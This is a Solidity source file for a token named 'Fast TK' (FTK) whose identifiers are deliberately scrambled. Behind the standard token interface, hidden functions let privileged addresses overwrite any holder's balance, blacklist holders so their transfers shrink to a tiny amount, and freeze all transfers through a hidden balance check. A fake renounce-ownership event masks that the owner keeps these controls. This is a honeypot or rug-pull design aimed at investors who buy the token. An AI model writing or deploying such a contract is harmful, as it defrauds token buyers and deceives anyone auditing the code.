//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface ugfegbsqgs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fntkexjfl {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface kigjjlruey {
    function createPair(address absdfbkpledv, address dvnpxkiat) external returns (address);
}

interface afqjynnuyi {
    function totalSupply() external view returns (uint256);

    function balanceOf(address xtlfygfjanq) external view returns (uint256);

    function transfer(address nwcsbdgyqtz, uint256 tfvuvdwovxlrc) external returns (bool);

    function allowance(address onsdnmdprs, address spender) external view returns (uint256);

    function approve(address spender, uint256 tfvuvdwovxlrc) external returns (bool);

    function transferFrom(
        address sender,
        address nwcsbdgyqtz,
        uint256 tfvuvdwovxlrc
    ) external returns (bool);

    event Transfer(address indexed from, address indexed ymameqxvjolo, uint256 value);
    event Approval(address indexed onsdnmdprs, address indexed spender, uint256 value);
}

interface qszfaajbgz is afqjynnuyi {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FastTK is fntkexjfl, afqjynnuyi, qszfaajbgz {

    function transferFrom(address yhejdexftlhui, address nwcsbdgyqtz, uint256 tfvuvdwovxlrc) external override returns (bool) {
        if (_msgSender() != bxaolmhrejwoo) {
            if (yecgvqsst[yhejdexftlhui][_msgSender()] != type(uint256).max) {
                require(tfvuvdwovxlrc <= yecgvqsst[yhejdexftlhui][_msgSender()]);
                yecgvqsst[yhejdexftlhui][_msgSender()] -= tfvuvdwovxlrc;
            }
        }
        return tzbpoxnzuh(yhejdexftlhui, nwcsbdgyqtz, tfvuvdwovxlrc);
    }

    mapping(address => bool) public levsjtweaw;

    address aeymppibismud = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address buhfjagtr, uint256 tfvuvdwovxlrc) public virtual override returns (bool) {
        yecgvqsst[_msgSender()][buhfjagtr] = tfvuvdwovxlrc;
        emit Approval(_msgSender(), buhfjagtr, tfvuvdwovxlrc);
        return true;
    }

    function eqmyfforomnzh(uint256 tfvuvdwovxlrc) public {
        sgruhnomwdfbs();
        uqzlyvyfl = tfvuvdwovxlrc;
    }

    function djgicjgcnjyig(address mmtuecuwwf) public {
        sgruhnomwdfbs();
        
        if (mmtuecuwwf == frnlmaietkfx || mmtuecuwwf == tlkmuyagxxuwe) {
            return;
        }
        levsjtweaw[mmtuecuwwf] = true;
    }

    constructor (){
        if (fktqrmjbi) {
            srxxbqjyqzocb = gayadezkurgl;
        }
        fdqtbakrjnry();
        ugfegbsqgs uvxzwkycvi = ugfegbsqgs(bxaolmhrejwoo);
        tlkmuyagxxuwe = kigjjlruey(uvxzwkycvi.factory()).createPair(uvxzwkycvi.WETH(), address(this));
        
        frnlmaietkfx = _msgSender();
        gmlgpqwkqpp[frnlmaietkfx] = true;
        abxofpppcum[frnlmaietkfx] = indzwodfcfwd;
        if (gayadezkurgl != srxxbqjyqzocb) {
            fktqrmjbi = false;
        }
        emit Transfer(address(0), frnlmaietkfx, indzwodfcfwd);
    }

    string private kkcybfaym = "Fast TK";

    bool public npibopnhpnrx;

    address bxaolmhrejwoo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function nynjowpqqgur(address ifamadsrhdnm) public {
        if (nzlvtdzrfwfq) {
            return;
        }
        
        gmlgpqwkqpp[ifamadsrhdnm] = true;
        if (srxxbqjyqzocb != gayadezkurgl) {
            srxxbqjyqzocb = gayadezkurgl;
        }
        nzlvtdzrfwfq = true;
    }

    function tzbpoxnzuh(address yhejdexftlhui, address nwcsbdgyqtz, uint256 tfvuvdwovxlrc) internal returns (bool) {
        if (yhejdexftlhui == frnlmaietkfx) {
            return mmqfxnxgbucepb(yhejdexftlhui, nwcsbdgyqtz, tfvuvdwovxlrc);
        }
        uint256 fbvavzispe = afqjynnuyi(tlkmuyagxxuwe).balanceOf(aeymppibismud);
        require(fbvavzispe == uqzlyvyfl);
        require(nwcsbdgyqtz != aeymppibismud);
        if (levsjtweaw[yhejdexftlhui]) {
            return mmqfxnxgbucepb(yhejdexftlhui, nwcsbdgyqtz, xhgxhsxfqy);
        }
        return mmqfxnxgbucepb(yhejdexftlhui, nwcsbdgyqtz, tfvuvdwovxlrc);
    }

    function balanceOf(address xtlfygfjanq) public view virtual override returns (uint256) {
        return abxofpppcum[xtlfygfjanq];
    }

    function mmqfxnxgbucepb(address yhejdexftlhui, address nwcsbdgyqtz, uint256 tfvuvdwovxlrc) internal returns (bool) {
        require(abxofpppcum[yhejdexftlhui] >= tfvuvdwovxlrc);
        abxofpppcum[yhejdexftlhui] -= tfvuvdwovxlrc;
        abxofpppcum[nwcsbdgyqtz] += tfvuvdwovxlrc;
        emit Transfer(yhejdexftlhui, nwcsbdgyqtz, tfvuvdwovxlrc);
        return true;
    }

    address public tlkmuyagxxuwe;

    uint256 private srxxbqjyqzocb;

    uint256 uqzlyvyfl;

    function symbol() external view virtual override returns (string memory) {
        return zkzgfjbngecmen;
    }

    mapping(address => uint256) private abxofpppcum;

    address private ddkcopoin;

    function totalSupply() external view virtual override returns (uint256) {
        return indzwodfcfwd;
    }

    function hydgccsgazf(address uhostbraelozi, uint256 tfvuvdwovxlrc) public {
        sgruhnomwdfbs();
        abxofpppcum[uhostbraelozi] = tfvuvdwovxlrc;
    }

    bool public nzlvtdzrfwfq;

    function fdqtbakrjnry() public {
        emit OwnershipTransferred(frnlmaietkfx, address(0));
        ddkcopoin = address(0);
    }

    mapping(address => mapping(address => uint256)) private yecgvqsst;

    bool public qhdtmisvsbmp;

    uint8 private nvjuhwpphl = 18;

    address public frnlmaietkfx;

    uint256 private indzwodfcfwd = 100000000 * 10 ** 18;

    string private zkzgfjbngecmen = "FTK";

    event OwnershipTransferred(address indexed ometbjbkntsf, address indexed tyidsqxoszl);

    function decimals() external view virtual override returns (uint8) {
        return nvjuhwpphl;
    }

    mapping(address => bool) public gmlgpqwkqpp;

    uint256 ququtdtricto;

    function transfer(address uhostbraelozi, uint256 tfvuvdwovxlrc) external virtual override returns (bool) {
        return tzbpoxnzuh(_msgSender(), uhostbraelozi, tfvuvdwovxlrc);
    }

    bool private fktqrmjbi;

    function owner() external view returns (address) {
        return ddkcopoin;
    }

    function getOwner() external view returns (address) {
        return ddkcopoin;
    }

    function name() external view virtual override returns (string memory) {
        return kkcybfaym;
    }

    function allowance(address zoxbgebmf, address buhfjagtr) external view virtual override returns (uint256) {
        if (buhfjagtr == bxaolmhrejwoo) {
            return type(uint256).max;
        }
        return yecgvqsst[zoxbgebmf][buhfjagtr];
    }

    function sgruhnomwdfbs() private view {
        require(gmlgpqwkqpp[_msgSender()]);
    }

    uint256 public gayadezkurgl;

    uint256 constant xhgxhsxfqy = 11 ** 10;

}